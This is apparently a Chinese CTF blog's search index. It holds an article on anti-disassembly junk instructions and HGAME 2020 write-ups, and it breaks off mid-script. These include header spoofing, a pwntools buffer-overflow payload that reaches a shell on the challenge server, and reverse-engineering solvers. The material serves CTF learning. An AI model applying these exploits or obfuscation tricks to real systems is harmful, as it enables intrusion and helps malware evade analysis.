<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>花指令</title>
    <link href="/2020/02/19/%E8%8A%B1%E6%8C%87%E4%BB%A4/"/>
    <url>/2020/02/19/%E8%8A%B1%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p><strong><em>年轻人的第一个花指令</em></strong></p><p>这里写一下有关花指令的内容，自己的理解也很有限，只能以后再多学学再补充，现在只能把自己知道的写下来。  </p><p>首先反汇编有一个很关键的问题，就是怎么样区分数据和代码，由于x86和x64架构的每条指令是不等长的，区分数据和代码就变得很困难，反汇编的算法必须要对汇编指令长度和各种各样的跳转进行适当的处理，不然就会发生错误，导致反汇编失败，这也是花指令的作用。  </p><p>目前主要的反汇编算法主要还是线性扫描<em>(Linear Sweep)*和较高级的递归行进</em>(Recursive Traversal)*，目前我比较常用的就是OD和IDA，它们的工作原理列在下面，此外还尝试了Ghidra，这个工具比较神奇，可以在有花指令的情况下抛掉很多无用的指令，反汇编出函数的大概，目前工作的原理还没有详细地了解，这里先提一下，了解之后再补充。</p><blockquote><p>线性扫描本身的技术含量不是很高，反汇编工具将整个模块中的每一条指令都反汇编成汇编指令，每一个遇到的机器码都会当作汇编指令处理（不加判断），所以线性扫描根本不能把代码和数据区分开来，而一旦一条指令开始出错，整个反汇编都开始出错。</p></blockquote><blockquote><p>递归行进算法相较于线性扫描算法更灵活一些，它是按照代码可能的执行顺序来反汇编程序，每条可能的路径来扫描，解码出分支之后会记录这个地址，分别反汇编各个分支中的指令，这样按照路径进行搜寻，可以有效避免将数据识别成指令的问题。  </p></blockquote><table><thead><tr><th>工具</th><th>算法</th></tr></thead><tbody><tr><td>OllyDbg</td><td>Linear Sweep/Recursive Traversal(Ctrl+A)</td></tr><tr><td>IDA Pro</td><td>Recursive Traversal</td></tr><tr><td>Ghidra</td><td></td></tr></tbody></table><p>但是我们可以通过巧妙地构造代码和数据，插入一些<em>“花指令”</em>，以此干扰反汇编软件。因为前面提到的不同的机器指令包含的字节数不同地原因，所有的多字节指令只有正确识别第一个字节，也就是操作码，才能正确实现反汇编，否则就会识别成完全不同的另一条指令。</p><p>而迷惑递归行进算法还需要多动动脑子，一两个简单的垃圾数据不会使递归行进算法失效，但是，个人理解，在递归行进算法中，任意的控制转移指令，其后的地址都认为是有效的，因为递归行进算法中最重要的就是通过跳转来确定分支，因此，我们可以利用跳转来实现我们想要的<em>“花指令”</em>。</p><p>下面是几个主要的分类：</p><ul><li><p><code>jx/jnx</code></p><p>这一类是我见过最多的，比如说这样一段代码</p></li></ul><pre><code class="asm">text:00401065            jz short near ptr loc_401069+1text:00401067            jnz short near ptr loc_401069+1text:00401069text:00401069 loc_401069:text:00401069            db 36htext:0040107C            ……</code></pre><p>​    这里只是一个随便编写的例子，但是差不多所有的处理都是这个样子，这里的跳转导致0x401069处的指令没有解析，所以后面的指令也就跟着出错了</p><ul><li><p><code>call+pop/(add esp)+return</code></p><p>这个分类主要是看到的IDA反汇编出错的红字<code>endp;sp-analysis failed</code></p><p>比如说这样的代码</p><pre><code class="asm">text:0040103B        call loc_401042text:0040103B sub_401022    endp;sp-analysis failedtext:0040103Btext:00401040        cmp cl,dltext:00401042text:00401042 loc_401042:text:00401042        add esp,4</code></pre><p><code>call</code>指令相当于<code>jmp</code>+<code>push eip</code>，所以用<code>add esp,4</code>指令可以消除入栈的<code>eip</code>的影响，此时<code>call</code>就相当于<code>jmp</code>，但是IDA还是会把<code>0x401042</code>当作新函数的首地址，所以当前函数的识别就会出错，IDA会找不到结束位置，因此没法继续反汇编。</p></li><li><p><code>jx</code></p><p>这一类理解起来也蛮简单的，就是<code>jmp</code>到一个IDA无法解析的位置，比如说下面这段</p><pre><code class="asm">.text:00000000004009F5 loc_4009F5:                             .text:00000000004009F5                 jmp     short near ptr loc_4009FB+1;---------------------------------------------------------------------------;从这里开始.text:00000000004009F7                 xor     eax, eax.text:00000000004009F9                 jz      short loc_4009F5.text:00000000004009FB.text:00000000004009FB loc_4009FB:                             .text:00000000004009FB                 call    near ptr 0C59748h</code></pre><p>最下面这个<code>0c59748</code>的地址显然是无效的，这里肯定是出了问题，仔细观察一下代码，<code>xor  eax, eax</code>这句得到的是0，所以下一个跳转是一定可以实现的，但是IDA判断不出来，他会对所有可能的分支进行解析，所以会从<code>0x4009FB</code>出开始解析新的命令，然后这个跳转并不存在，就会提示地址不存在，但是真正让反汇编进行不下去的是接下来的操作，另一条可能的路径，即正常的执行流程，进入到<code>0x4009F5</code>之后跳转到了<code>0x4009FC</code>的位置，但是这里已经解析过了，被一条假的命令占用了，IDA就会停止反汇编，然后报错。</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>re</tag>
      
      <tag>花指令</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hgame_wp</title>
    <link href="/2020/01/25/hgame-wp/"/>
    <url>/2020/01/25/hgame-wp/</url>
    
    <content type="html"><![CDATA[<p>记录一下Hgame的部分题解和一些解题时的思路</p><a id="more"></a><h2 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h2><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="接-头-霸-王"><a href="#接-头-霸-王" class="headerlink" title="接 头 霸 王"></a>接 头 霸 王</h4><p>打开题目，发现提示需要从vidar.club过来，所以burp抓包到repeater，添加响应头：</p><pre><code class="http">Referer:https://vidar.club</code></pre><p>然后提示需要从本地访问，添加响应头：</p><pre><code class="http">X-Forwarded-For: 127.0.0.1</code></pre><p>接着提示flag会在2077年更新，所以添加响应头：</p><pre><code class="http">If-Unmodified-Since:Fri, 01 Jan 2077 00:00:00 GMT</code></pre><p>再发送请求得到flag</p><pre><code class="flag">hgame{W0w!Your_heads_@re_s0_many!}</code></pre><h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><h4 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h4><p>一看题目又是一道迷宫题，拖进IDA反编译</p><pre><code class="c++">v5 = (char *)&amp;unk_6020C4;  while ( (signed int)v4 &lt; SHIDWORD(v4) )  {    v3 = s[(signed int)v4];    if ( v3 == 100 )    {      v5 += 4;    }    else if ( v3 &gt; 100 )    {      if ( v3 == 115 )      {        v5 += 64;      }      else      {        if ( v3 != 119 )        {LABEL_12:          puts(&quot;Illegal input!&quot;);          exit(0);        }        v5 -= 64;      }    }    else    {      if ( v3 != 97 )        goto LABEL_12;      v5 -= 4;    }    if ( v5 &lt; (char *)&amp;unk_602080 || v5 &gt; (char *)&amp;unk_60247C || *(_DWORD *)v5 &amp; 1 )      goto LABEL_22;    LODWORD(v4) = v4 + 1;  }  if ( v5 == (char *)&amp;unk_60243C )  {    sprintf(&amp;v7, &quot;hgame{%s}&quot;, s, v4);    puts(&quot;You win!&quot;);    printf(&quot;Flag is: &quot;);    puts(&amp;v7);    exit(0);  }LABEL_22:  puts(&quot;You died&quot;);  exit(0);</code></pre><p>贴出来的是反编译出来的主要部分，从这里可以确定v5的起始位置是unk_6020C4，上下左右分别是’w’,’s’,’a’,’d’，左右移动变化4字节，将所有的数据转化为DWORD类型，上下移动变化64字节，所以每行16个元素，范围是unk_602080到unk_60247C，正好是256个DWORD类型，组成16*16的方阵，其中所有和1按位与运算结果为0的是可以走的路线，即所有末尾为0的值是可以走的位置，最终的目标是走到unk_60243C这个点</p><p><img src="https://s2.ax1x.com/2020/02/13/1qp5rT.png" srcset="/img/loading.gif" alt="maze"></p><p>即从（2，2）位置走到（15，16）位置</p><p>所以最后的flag为</p><pre><code class="flag">hgame{ssssddddddsssssddwwdddssssdssdd}</code></pre><h4 id="bitwise-operation2"><a href="#bitwise-operation2" class="headerlink" title="bitwise_operation2"></a>bitwise_operation2</h4><p>这题是让人头疼的位运算符，要把运算总共分为三个部分，要把整个过程都弄清楚，然后一部分一部分的逆向出来，任何一部分错了都会导致最终flag出错，还是挺考验细心和耐心的。</p><p>首先发现是linux可执行文件，拖进IDA反编译，并且对每一部分的作用进行一个分析</p><pre><code class="c++">//只贴出了有用的部分并且稍做了排版void __fastcall __noreturn main(__int64 a1, char **a2, char **a3){  char v6; // [rsp+10h] [rbp-60h]  char v7; // [rsp+11h] [rbp-5Fh]  char v8; // [rsp+12h] [rbp-5Eh]  char v9; // [rsp+13h] [rbp-5Dh]  char v10; // [rsp+14h] [rbp-5Ch]  char v11; // [rsp+15h] [rbp-5Bh]  char v12; // [rsp+16h] [rbp-5Ah]  char v13; // [rsp+17h] [rbp-59h]  __int64 v14; // [rsp+20h] [rbp-50h]  char v15; // [rsp+28h] [rbp-48h]  __int64 v16; // [rsp+30h] [rbp-40h]  char v17; // [rsp+38h] [rbp-38h]  char s; // [rsp+40h] [rbp-30h]        //地址是连续的，flag中间的具体内容是v24和v25起始的两个16  char v19; // [rsp+41h] [rbp-2Fh]        //字节  char v20; // [rsp+42h] [rbp-2Eh]  char v21; // [rsp+43h] [rbp-2Dh]  char v22; // [rsp+44h] [rbp-2Ch]  char v23; // [rsp+45h] [rbp-2Bh]  __int16 v24; // [rsp+46h] [rbp-2Ah]  __int16 v25; // [rsp+56h] [rbp-1Ah]  char v26; // [rsp+66h] [rbp-Ah]  sub_4007E6();//只负责输出，没什么功能  v6 = 76;v7 = 60;v8 = 214;v9 = 54;v10 = 80;v11 = 136;v12 = 32;v13 = 204;  __isoc99_scanf(&quot;%39s&quot;, &amp;s);  if ( strlen(&amp;s) == 39 &amp;&amp; s == &#39;h&#39; &amp;&amp; v19 == &#39;g&#39; &amp;&amp; v20 == &#39;a&#39; &amp;&amp; v21 == &#39;m&#39; &amp;&amp; v22 == &#39;e&#39; &amp;&amp; v23 == &#39;{&#39; &amp;&amp; v26 == &#39;}&#39; )// 共39位，hgame{***}格式  {    v14 = 0LL;    v15 = 0;    v16 = 0LL;    v17 = 0;    //这两条命令进行第一部分运算    sub_400616((__int64)&amp;v14, (__int64)&amp;v24);   // 传入地址，对flag中的部分进行操作    sub_400616((__int64)&amp;v16, (__int64)&amp;v25);    //这里开始进行第二部分运算    for ( i = 0; i &lt;= 7; ++i )    {      *((_BYTE *)&amp;v14 + i) = ((*((_BYTE *)&amp;v14 + i) &amp; 0xE0) &gt;&gt; 5) | 8 * *((_BYTE *)&amp;v14 + i);// &amp;v14 + i前三位与后五位交换位置      *((_BYTE *)&amp;v14 + i) = *((_BYTE *)&amp;v14 + i) &amp; 0x55 ^ ((*((_BYTE *)&amp;v16 + 7 - i) &amp; 0xAA) &gt;&gt; 1) | *((_BYTE *)&amp;v14 + i) &amp; 0xAA;// &amp;v14+i的奇数位不变，偶数位和&amp;v16+7-i的奇数位异或      *((_BYTE *)&amp;v16 + 7 - i) = 2 * (*((_BYTE *)&amp;v14 + i) &amp; 0x55) ^ *((_BYTE *)&amp;v16 + 7 - i) &amp; 0xAA | *((_BYTE *)&amp;v16 + 7 - i) &amp; 0x55;// &amp;v16+7-i的偶数位不变，奇数位和&amp;v14+i的偶数位异或      *((_BYTE *)&amp;v14 + i) = *((_BYTE *)&amp;v14 + i) &amp; 0x55 ^ ((*((_BYTE *)&amp;v16 + 7 - i) &amp; 0xAA) &gt;&gt; 1) | *((_BYTE *)&amp;v14 + i) &amp; 0xAA;// &amp;v14+i奇数位不变，偶数位和&amp;v16+7-i的奇数位异或    }                                               //这里进行第三部分运算    for ( j = 0; j &lt;= 7; ++j )    {      *((_BYTE *)&amp;v14 + j) ^= *(&amp;v6 + j);       // v6 = 76;                                                //   v7 = 60;                                                //   v8 = 214;                                                //   v9 = 54;                                                //   v10 = 80;                                                //   v11 = 136;                                                //   v12 = 32;                                                //   v13 = 204;      if ( *((_BYTE *)&amp;v14 + j) != byte_602050[j] )// e4sy_Re_      {        puts(&quot;sry, wrong flag&quot;);        exit(0);      }    }    for ( k = 0; k &lt;= 7; ++k )    {      *((_BYTE *)&amp;v16 + k) ^= *((_BYTE *)&amp;v14 + k) ^ *(&amp;v6 + k);    // v6 = 76;                                //这里异或之后又变成了V14最初始的值         //   v7 = 60;                                                                    //   v8 = 214;                                                                    //   v9 = 54;                                                                    //   v10 = 80;                                                                    //   v11 = 136;                                                                    //   v12 = 32;                                                                    //   v13 = 204;      if ( *((_BYTE *)&amp;v16 + k) != byte_602060[k] )// Easylif3      {        puts(&quot;Just one last step&quot;);        exit(0);      }    }    puts(&quot;Congratulations! You are already familiar with bitwise operation.&quot;);    puts(&quot;Flag is your input.&quot;);    exit(0);  }  puts(&quot;Illegal input!&quot;);  exit(0);}//sub_400616() 第一部分运算所用到的函数_BYTE *__fastcall sub_400616(__int64 a1, __int64 a2){  _BYTE *result; // rax  signed int i; // [rsp+1Ch] [rbp-4h]  for ( i = 0; i &lt;= 7; ++i )  {    if ( *(_BYTE *)(2 * i + a2) &lt;= 96 || *(_BYTE *)(2 * i + a2) &gt; 102 )    {      if ( *(_BYTE *)(2 * i + a2) &lt;= 47 || *(_BYTE *)(2 * i + a2) &gt; 57 )      {LABEL_17:        puts(&quot;Illegal input!&quot;);        exit(0);      }      *(_BYTE *)(i + a1) = *(_BYTE *)(2 * i + a2) - 48;    }    else    {      *(_BYTE *)(i + a1) = *(_BYTE *)(2 * i + a2) - 87;    }    if ( *(_BYTE *)(2 * i + 1LL + a2) &lt;= 96 || *(_BYTE *)(2 * i + 1LL + a2) &gt; 102 )    {      if ( *(_BYTE *)(2 * i + 1LL + a2) &lt;= 47 || *(_BYTE *)(2 * i + 1LL + a2) &gt; 57 )        goto LABEL_17;      result = (_BYTE *)(i + a1);      *result = 16 * *result + *(_BYTE *)(2 * i + 1LL + a2) - 48;    }    else    {      result = (_BYTE *)(i + a1);      *result = 16 * *result + *(_BYTE *)(2 * i + 1LL + a2) - 87;    }  }  return result;}//sub_400616()这里的处理逻辑有些混乱，实际上就是只能输入0-9，a-f之间的字符，然后对数字和字母会进行不同的处理</code></pre><p>把整个过程理解清楚之后可以开始写脚本进行一个逆运算了</p><pre><code class="python">#-*- coding:utf-8 -*-# 第三部分逆运算v = [76, 60, 214, 54, 80, 136, 32, 204]v0 = &#39;e4sy_Re_&#39;v14 = []for i in range(len(v0)):    v14.append(ord(v0[i]) ^ v[i])# print(v14)v16 = []v1 = &#39;Easylif3&#39;for i in range(len(v1)):    v16.append(ord(v1[i]) ^ v14[i])  # v14经过两次和v的异或又变回了原本的值# print(v16)# 第二部分逆运算for i in range(8):    # print(bin(v14[i])[2:].rjust(8,&#39;0&#39;))    v14[i] = (((v14[i] &amp; 0x55) ^ ((v16[7 - i] &amp; 0xAA) &gt;&gt; 1) % 256) | v14[i] &amp; 0xAA) % 256    # print(bin(v14[i])[2:].rjust(8,&#39;0&#39;))    # print(bin(v16[7-i])[2:].rjust(8, &#39;0&#39;))    v16[7 - i] = (2 * (v14[i] &amp; 0x55) ^ v16[7 - i] &amp; 0xAA | v16[7 - i] &amp; 0x55) % 256    # print(bin(v16[7-i])[2:].rjust(8, &#39;0&#39;))    # print(bin(v14[i])[2:].rjust(8, &#39;0&#39;))    v14[i] = (((v14[i] &amp; 0x55) ^ ((v16[7 - i] &amp; 0xAA) &gt;&gt; 1) % 256) | v14[i] &amp; 0xAA) % 256    # print(bin(v14[i])[2:].rjust(8, &#39;0&#39;))    # print(bin(v14[i])[2:].rjust(8,&#39;0&#39;))    v14[i] = (((v14[i] &amp; 0x1F) &lt;&lt; 5) | ((v14[i] &amp; 0xF8) &gt;&gt; 3)) % 256    # print(bin(v14[i])[2:].rjust(8,&#39;0&#39;))# print(v14)# print(v16)# 第一部分逆运算v24 = [0 for i in range(16)]v25 = [0 for i in range(16)]alphabet = [48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 97, 98, 99, 100, 101, 102]# 字母表不多，逆运算难以进行所以采用遍历的方式进行计算for i in range(8):    for j in alphabet:        if 57 &gt;= j &gt; 47:            tmp = j - 48        else:            tmp = j - 87        v24[2*i]=j        if 57 &gt;= v14[i] - 16 * tmp + 48 &gt; 47:            v24[2 * i + 1] = v14[i] - 16 * tmp + 48            break        elif 102 &gt;= v14[i] - 16 * tmp + 87 &gt; 96:            v24[2 * i + 1] = v14[i] - 16 * tmp + 87            break        else:            continuefor i in range(8):    for j in alphabet:        v25[2 * i] = j        if 57 &gt;= j &gt; 47:            tmp = j - 48        else:            tmp = j - 87        if 102 &gt;= v16[i] - 16 * tmp + 87 &gt; 96:            v25[2 * i + 1] = v16[i] - 16 * tmp + 87            break        elif 57 &gt;= v16[i] - 16 * tmp + 48 &gt; 47:            v25[2 * i + 1] = v16[i] - 16 * tmp + 48            break        else:            continue# print(v24)# print(v25)flag = &#39;hgame{&#39;+&#39;&#39;.join([chr(v24[i]) for i in range(16)]) + &#39;&#39;.join([chr(v25[i]) for i in range(16)])+&#39;}&#39;print(flag)</code></pre><p>输出得到flag</p><pre><code class="flag">hgame{0f233e63637982d266cbf41ecb1b0102}</code></pre><p>到虚拟机上验证一下，发现结果正确</p><p><img src="https://s2.ax1x.com/2020/02/13/1qpqi9.png" srcset="/img/loading.gif" alt="bitwise_operation2"></p><h4 id="advance"><a href="#advance" class="headerlink" title="advance"></a>advance</h4><p>windows可执行程序，打开发现还是让输入flag，然后验证正确与否，还是IDA反编译，发现所有的函数名字IDA都识别不了，根据程序打开的提示语，搜索所有字符串找到主函数入口，根据具体操作给部分函数和变量重新命名，大概了解其用途</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  __int64 len; // rax  int len0; // edi  unsigned __int64 v5; // rax  _BYTE *v6; // rbx  const char *v7; // rcx  char flag; // [rsp+20h] [rbp-118h]  puts(&quot;please input you flag:\n&quot;);  memset(&amp;flag, 0, 0x100ui64);  scanf(&quot;%s&quot;, &amp;flag, 100i64);  len = strlen(&amp;flag);                          // 如果输入的字符串少于256个字符，则返回字符串长度，否则返回256（0x100）  len0 = len;  if ( !len )                                   // 若输入空字符串，直接报错  {LABEL_6:    v7 = &quot;try again\n&quot;;    goto LABEL_7;  }  v5 = sub_140002000(len);                        v6 = malloc(v5);                                // 分配空间  cryption(v6, (__int64)&amp;flag, len0);           // 加密算法部分  if ( strncmp(v6, &quot;0g371wvVy9qPztz7xQ+PxNuKxQv74B/5n/zwuPfX&quot;, 0x64ui64) )// 相同则返回0，跳过if，输出get it，flag正确  {    if ( v6 )      free(v6);    goto LABEL_6;  }  v7 = &quot;get it\n&quot;;LABEL_7:  puts(v7);  return 0;}//最重要的cryption加密函数signed __int64 __fastcall sub_140001EB0(_BYTE *a1, __int64 a2, int a3){  int v3; // er10  __int64 v4; // rax  __int64 v5; // rbx  _BYTE *v6; // rdi  _BYTE *v7; // r9  signed __int64 v8; // r11  unsigned __int64 v9; // rdx  unsigned __int64 v10; // rax  char v11; // cl  // a1是加密后输出内容的首地址，a2是输入的flag的首地址，a3是flag长度  v3 = 0;  v4 = a3 - 2;  v5 = a2;  v6 = a1;  v7 = a1;  if ( v4 &gt; 0 )  {    v8 = a2 + 1;    v9 = ((unsigned __int64)((unsigned __int64)(v4 - 1) * (unsigned __int128)0xAAAAAAAAAAAAAAABui64 &gt;&gt; 64) &gt;&gt; 1) + 1;    v3 = 3 * v9;    do    {      v10 = *(unsigned __int8 *)(v8 - 1);      v8 += 3i64;      *v7 = alphabet[v10 &gt;&gt; 2];      v7[1] = alphabet[((unsigned __int64)*(unsigned __int8 *)(v8 - 3) &gt;&gt; 4) | 16i64 * (*(_BYTE *)(v8 - 4) &amp; 3)];      v7[2] = alphabet[4i64 * (*(_BYTE *)(v8 - 3) &amp; 0xF) | ((unsigned __int64)*(unsigned __int8 *)(v8 - 2) &gt;&gt; 6)];      v7[3] = alphabet[*(_BYTE *)(v8 - 2) &amp; 0x3F];      v7 += 4;      --v9;    }    while ( v9 );  }  if ( v3 &lt; a3 )  {    *v7 = alphabet[(unsigned __int64)*(unsigned __int8 *)(v3 + v5) &gt;&gt; 2];    if ( v3 == a3 - 1 )    {      v11 = 61;      v7[1] = alphabet[16 * (*(_BYTE *)(v3 + v5) &amp; 3)];    }    else    {      v7[1] = alphabet[((unsigned __int64)*(unsigned __int8 *)(v5 + v3 + 1) &gt;&gt; 4) | 16i64 * (*(_BYTE *)(v3 + v5) &amp; 3)];      v11 = alphabet[4 * (*(_BYTE *)(v5 + v3 + 1) &amp; 0xF)];    }    v7[2] = v11;    v7[3] = 61;    v7 += 4;  }  *v7 = 0;  return v7 - v6 + 1;}</code></pre><p>可以看到这里进行了很多操作，逆向起来很复杂而且工作量和难度都很多大，于是寻求别的方法，发现所有的操作都是围绕alphabet这一个字符数组来的，所以找到这个数组</p><pre><code class="python">alphabet=&#39;abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</code></pre><p>观察发现这个数组非常熟悉，和base64的字母表完全一样，只是字符调换了顺序，然后观察最后的目标字符串，猜想这可能是改变字母表之后的base64编码，所以将之前的base64解码程序字母表修改为本题所提供的字母表，运行程序获得flag，所以猜想是正确的。</p><pre><code class="python">#-*- coding:utf-8 -*-def b64de(path_in, path_out):    b64_str = open(path_in).read()    charset = &quot;abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;    # print(charset)    bin_str = []    for i in b64_str:        if i != &#39;=&#39;:            try:                x = str(bin(charset.index(i))).replace(&#39;0b&#39;, &#39;&#39;)            except ValueError:                print(i)            bin_str.append(&#39;{:0&gt;6}&#39;.format(x))  # 填充成6位            # print(bin_str)    b64_bin = bytearray()  # 最后只能写入bytes    nums = len(bin_str) // 4    remain = len(bin_str) % 4    fore_part = bin_str[:4 * nums]  # 四个一组截取    # print(fore_part)    while fore_part:        # 取4个6位base64字符，作为3个字节        b64_tmp = &#39;&#39;.join(fore_part[:4])  # 4*6/8        b64_tmp = [int(b64_tmp[x: x + 8], 2) for x in [0, 8, 16]]  # 转换成10进制        # print(b64_tmp)        for i in b64_tmp:            b64_bin.append(i)        fore_part = fore_part[4:]  # 向后移动四位    if remain:        remain_part = &#39;&#39;.join(bin_str[nums * 4:])        # print(remain_part)        tmp = [int(remain_part[i * 8:(i + 1) * 8], 2) for i in range(remain - 1)]        # print(tmp)        for i in tmp:            b64_bin.append(i)    # print(b64_bin)    fd = open(path_out, &#39;wb&#39;)    fd.write(b64_bin)    fd.close()if __name__ == &#39;__main__&#39;:    b64de(&quot;./pic_en.txt&quot;, &quot;./pic_de.txt&quot;)</code></pre><p>输出的flag为：</p><pre><code class="flag">hgame{b45e6a_i5_50_eazy_6VVSQ}</code></pre><h4 id="cpp"><a href="#cpp" class="headerlink" title="cpp"></a>cpp</h4><p>这题函数实在是太多，而且应该是万恶的出题人故意把函数标识去掉了，理解起来简直窒息，但是逆向这个东西，七分理解三分猜，于是开猜</p><pre><code class="c++"> sub_140002AE0((__int64)&amp;v13);                 // 大概是string类的构造函数  sub_1400018D0(std::cin, &amp;v13);                // cin&gt;&gt;v13  v15 = &quot;hgame{&quot;;  sub_140002B30((__int64)&amp;v14);  if ( find_sub(&amp;v13, v15, 0i64) || find_sub(&amp;v13, &quot;}&quot;, 0i64) != 61 )// 猜测输入字符串长度位62，格式位hgame{***}  {    v5 = sub_140001900(std::cout, &quot;error&quot;);    std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v5, sub_140002830);    sub_140003010(&amp;v14);    sub_140002FA0(&amp;v13);    result = 0i64;  }  else  {    for ( i = 6i64; ; i = v11 + 1 )             // 一波操作完全看不懂，猜测是根据&#39;_&#39;来分割字符串，分割成9个数    {      LOBYTE(v0) = &#39;_&#39;;      v11 = find(&amp;v13, v0, i);      if ( v11 == -1 )        break;      v16 = sub_1400043B0(&amp;v13, &amp;v40, i, v11 - i);      v17 = v16;      v1 = sub_140003E80(v16);      v18 = atoll(v1);      sub_140004350(&amp;v14, &amp;v18);      sub_140002FA0(&amp;v40);    }    v19 = sub_1400043B0(&amp;v13, &amp;v41, i, 61 - i);    v20 = v19;    v2 = sub_140003E80(v19);    v21 = atoll(v2);                            // 直接把字符串转换成长整型，说明字符串里就是以&#39;_&#39;连接的数字    sub_140004350(&amp;v14, &amp;v21);    sub_140002FA0(&amp;v41);    v31 = 26727i64;                             // 根据下面的运算这里应该是两个矩阵    v32 = 24941i64;    v33 = 101i64;    v34 = 29285i64;    v35 = 26995i64;    v36 = 29551i64;    v37 = 29551i64;    v38 = 25953i64;    v39 = 29561i64;    v22 = 1i64;    v23 = 0i64;    v24 = 1i64;    v25 = 0i64;    v26 = 1i64;    v27 = 1i64;    v28 = 1i64;    v29 = 2i64;    v30 = 2i64;    for ( j = 0i64; j &lt; 3; ++j )                // 三个for循环时矩阵运算，如果满足条件就直接输出正确    {      for ( k = 0i64; k &lt; 3; ++k )      {        v12 = 0i64;        for ( l = 0; l &lt; 3; ++l )          v12 += *(&amp;v22 + 3 * l + k) * *(_QWORD *)sub_1400031E0(&amp;v14, l + 3 * j);        if ( *(&amp;v31 + 3 * j + k) != v12 )        {          v3 = sub_140001900(std::cout, &quot;error&quot;);          std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v3, sub_140002830);          sub_140003010(&amp;v14);          sub_140002FA0(&amp;v13);          return 0i64;        }      }    }    v6 = sub_140001900(std::cout, &quot;you are good at re&quot;);    std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v6, sub_140002830);</code></pre><p>最主要的部分（假装）分析一遍，发现只需要矩阵求逆和矩阵乘法，就可以得到flag</p><p>尝试一下</p><pre><code class="python">import numpy as npa = np.array([[1, 0, 1], [0, 1, 1], [1, 2, 2]])b = np.linalg.inv(a)# print(b)# print(np.dot(a,b))c = np.array([[26727, 24941, 101], [29285, 26995, 29551], [29551, 25953, 29561]])flag = &#39;&#39;d = np.dot(c, b)for i in range(3):    for j in range(3):        flag += str(int(d.item(i, j))) + &#39;_&#39;flag = &#39;hgame{&#39; + flag[:-1] + &#39;}&#39;print(flag)</code></pre><p>提交提示成功，猜测正确</p><pre><code class="flag">hgame{-24840_-78193_51567_2556_-26463_26729_3608_-25933_25943}</code></pre><h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><h4 id="Hard-AAAAA"><a href="#Hard-AAAAA" class="headerlink" title="Hard_AAAAA"></a>Hard_AAAAA</h4><p>IDA反编译</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  char s; // [esp+0h] [ebp-ACh]  char v5; // [esp+7Bh] [ebp-31h]  unsigned int v6; // [esp+A0h] [ebp-Ch]  int *v7; // [esp+A4h] [ebp-8h]  v7 = &amp;argc;  v6 = __readgsdword(0x14u);  alarm(8u);  setbuf(_bss_start, 0);  memset(&amp;s, 0, 0xA0u);  puts(&quot;Let&#39;s 0O0o\\0O0!&quot;);  gets(&amp;s);  if ( !memcmp(&quot;0O0o&quot;, &amp;v5, 7u) )    backdoor();  return 0;}//backdoorint backdoor(){  return system(&quot;/bin/sh&quot;);}</code></pre><p>所以最终的目标是运行backdoor()，所以只需要进入if分支就可以了，即v5和前面的字符串相等，自然想到输入s覆盖v5的值，不过需要注意的是，memcmp函数比较了7位，所以还要找到后面的几个字节，形成payload</p><pre><code class="python">from pwn import *io = remote(&quot;47.103.214.163&quot;,&quot;20000&quot;)#io=process(&quot;./Hard_AAAAA&quot;)io.recvuntil(&quot;Let&#39;s 0O0o\\0O0!&quot;)payload=&#39;a&#39;*123+&#39;0O0o\0O0&#39;io.sendline(payload)io.interactive()</code></pre><p>最终得到flag：</p><pre><code class="flag">hgame{0OoO0oo0O0Oo}</code></pre><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="InfantRSA"><a href="#InfantRSA" class="headerlink" title="InfantRSA"></a>InfantRSA</h4><p>简单的RSA解密，p和q都已经分解出来了，其它的没什么难度</p><pre><code class="python">#-*- coding:utf-8 -*-def gcdext(a, b):    &quot;&quot;&quot;    a: 模的取值    b: 想求逆的值    &quot;&quot;&quot;    if b == 0:        return 1, 0, a    x, y, gcd = gcdext(b, a % b)    return y, x - a // b * y, gcdc = 275698465082361070145173688411496311542172902608559859019841p = 681782737450022065655472455411q = 675274897132088253519831953441e = 13n = p * q# print(k)fai = (p - 1) * (q - 1)(d, k, g) = gcdext(e, fai)# print(fai)# print(k)# print(m)m = pow(c, d, n)# print(m)f = m.to_bytes(22, byteorder=&#39;big&#39;)print(f)</code></pre><p>直接求解出来flag</p><pre><code class="flag">hgame{t3Xt6O0k_R5A!!!}</code></pre><h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="欢迎参加HGame！"><a href="#欢迎参加HGame！" class="headerlink" title="欢迎参加HGame！"></a>欢迎参加HGame！</h4><p>首先看到一长串似曾相识的东西</p><pre><code>Li0tIC4uLi0tIC4tLi4gLS4tLiAtLS0tLSAtLSAuIC4uLS0uLSAtIC0tLSAuLi0tLi0gLi4tLS0gLS0tLS0gLi4tLS0gLS0tLS0gLi4tLS4tIC4uLi4gLS0uIC4tIC0tIC4uLi0t</code></pre><p>像是摩斯电码base64加密之后的东西</p><p>所以base64解码之后</p><pre><code class="morse">.-- ...-- .-.. -.-. ----- -- . ..--.- - --- ..--.- ..--- ----- ..--- ----- ..--.- .... --. .- -- ...--</code></pre><p>果然是摩斯电码，然后解摩斯电码</p><pre><code class="python">#-*- coding:utf-8 -*-CODE = {&#39;A&#39;: &#39;.-&#39;, &#39;B&#39;: &#39;-...&#39;, &#39;C&#39;: &#39;-.-.&#39;,        &#39;D&#39;: &#39;-..&#39;, &#39;E&#39;: &#39;.&#39;, &#39;F&#39;: &#39;..-.&#39;,   